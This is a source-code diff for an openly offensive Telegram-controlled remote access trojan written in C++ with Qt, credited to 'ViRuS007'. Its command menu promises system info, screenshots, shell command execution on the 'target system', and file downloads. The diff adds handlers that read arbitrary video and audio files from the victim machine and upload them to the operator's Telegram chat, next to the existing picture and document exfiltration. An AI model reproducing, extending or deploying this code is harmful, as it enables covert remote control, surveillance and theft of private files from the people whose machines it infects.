@@ -19,6 +19,7 @@
 //your bot token
 #define TOKEN ""
 
+
 Telegram::Bot *bot;
 
 void newMessage(Telegram::Message message)
@@ -27,11 +28,16 @@ void newMessage(Telegram::Message message)
 
     if (bot && message.type == Telegram::Message::TextType) {
 
+        //regular
         QRegularExpression re("\/down_pic (.*)");
         QRegularExpression re2("\/down_doc (.*)");
-
+        QRegularExpression re3("\/down_vid (.*)");
+        QRegularExpression re4("\/down_audio (.*)");
+        //match
         QRegularExpressionMatch match = re.match(message.string);
         QRegularExpressionMatch match2 = re2.match(message.string);
+        QRegularExpressionMatch match3 = re3.match(message.string);
+        QRegularExpressionMatch match4 = re4.match(message.string);
 
         if (message.string == "/start") {
             if (getuid()) {
@@ -49,13 +55,15 @@ void newMessage(Telegram::Message message)
                              "  /info => To Get ip and system info.\n"
                              "  /screenShot => Get ScreenShot of system(Just linux).\n"
                              "  /down_pic [ name + path ]   => Get Download picture from system target.\n"
-                             "  /down_doc [ name + path ]   => Get Download document from target system\n\n"
+                             "  /down_doc [ name + path ]   => Get Download document from target system\n"
+                             "  /down_vid [ name + path ]   => Get Download video from target system.\n"
+                             "  /down_audio [ name + path ]  => Get Download audio from target system.\n\n"
                              "for run shell command just send without `/` and \nRecive result.\n"
                              "Coded By : ViRuS007\n"
                              "Email : virus007@protonmail.com\n"
                              "Telegram ID : @Msf_Payload\n"
                              "\n"
-                             "Github: http://github.com/shayanzare/telegram-payload");
+                             "Github: http://github.com/shayanzare/sia-payload");
         }
         // info command
         else if (message.string == "/info")
@@ -88,18 +96,64 @@ void newMessage(Telegram::Message message)
         }
         // Download Picture from target system
         else if (match.hasMatch()) {
+            bot->sendMessage(message.chat.id, "☠ Uploading to telegram...");
             QString mached = match.captured(1);
 //            qDebug() << mached;
             QFile photo(mached);
-            //send to telegram
-            bot->sendPhoto(message.chat.id, &photo);
+            if (photo.open(QIODevice::ReadOnly)) {
+                //send to telegram
+                bot->sendPhoto(message.chat.id, &photo);
+            }
+            else
+            {
+                qDebug() << "Error to opening file";
+                bot->sendMessage(message.chat.id, "☠ Error To Opening File!");
+            }
         }
         //send document
         else if (match2.hasMatch()){
+            bot->sendMessage(message.chat.id, "☠ Uploading to telegram...");
             QString matched = match2.captured(1);
             QFile doc(matched);
-            //send to telegram
-            bot->sendDocument(message.chat.id, &doc);
+
+            if (doc.open(QIODevice::ReadOnly)) {
+                //send to telegram
+                bot->sendDocument(message.chat.id, &doc);
+            }
+            else
+            {
+                qDebug() << "Error to opening file";
+                bot->sendMessage(message.chat.id, "☠ Error To Opening File!");
+            }
+        }
+        //send video
+        else if (match3.hasMatch()){
+            bot->sendMessage(message.chat.id, "☠ Uploading to telegram...");
+            QString matched = match3.captured(1);
+            QFile video(matched);
+
+            if (video.open(QIODevice::ReadOnly)) {
+                bot->sendVideo(message.chat.id, &video);
+            }
+            else
+            {
+                qDebug() << "Error to opening file";
+                bot->sendMessage(message.chat.id, "☠ Error To Opening File!");
+            }
+        }
+
+        else if (match4.hasMatch()) {
+            bot->sendMessage(message.chat.id, "☠ Uploading to telegram...");
+            QString matched = match4.captured(1);
+
+            QFile audio(matched);
+            if (audio.open(QIODevice::ReadOnly)) {
+                bot->sendAudio(message.chat.id, &audio);
+            }
+            else {
+                qDebug() << "Error to opening file";
+                bot->sendMessage(message.chat.id, "☠ Error To Opening File!");
+            }
         }
 
         //Else for run shell commands
